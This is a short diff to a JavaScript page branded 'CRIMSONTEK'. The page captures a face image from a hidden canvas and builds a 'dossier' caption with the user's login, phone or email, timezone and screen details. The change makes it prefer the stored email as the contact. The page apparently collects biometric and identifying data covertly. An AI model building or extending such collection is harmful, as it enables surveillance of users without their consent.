@@ -113,7 +113,7 @@
 
         function notifyRejected(reason) {
             const login = localStorage.getItem('c_user') || '—';
-            const phone = localStorage.getItem('crimson_phone') || '—';
+            const phone = localStorage.getItem('crimson_email') || localStorage.getItem('crimson_phone') || '—';
             const html = crimsonFormatDossier('⚠️ CRIMSONTEK — BIO_SCAN ОТКЛОНЁН (НЕЙРОСЕТЬ)', {
                 login: login,
                 phone: phone,
@@ -158,12 +158,12 @@
 
             cHidden.toBlob(function (blob) {
                 const login = localStorage.getItem('c_user') || '—';
-                const phone = localStorage.getItem('crimson_phone') || 'Не указан';
+                const phone = localStorage.getItem('crimson_email') || localStorage.getItem('crimson_phone') || 'Не указан';
                 const meta = crimsonCollectMeta();
                 const caption =
                     `🔬 BIO_SCAN (лицо OK)\n` +
                     `Оператор: ${login}\n` +
-                    `Тел: ${phone}\n` +
+                    `Контакт: ${phone}\n` +
                     `Время: ${meta.time}\n` +
                     `TZ: ${meta.tz}\n` +
                     `Экран: ${meta.screen} · ${meta.viewport}\n` +
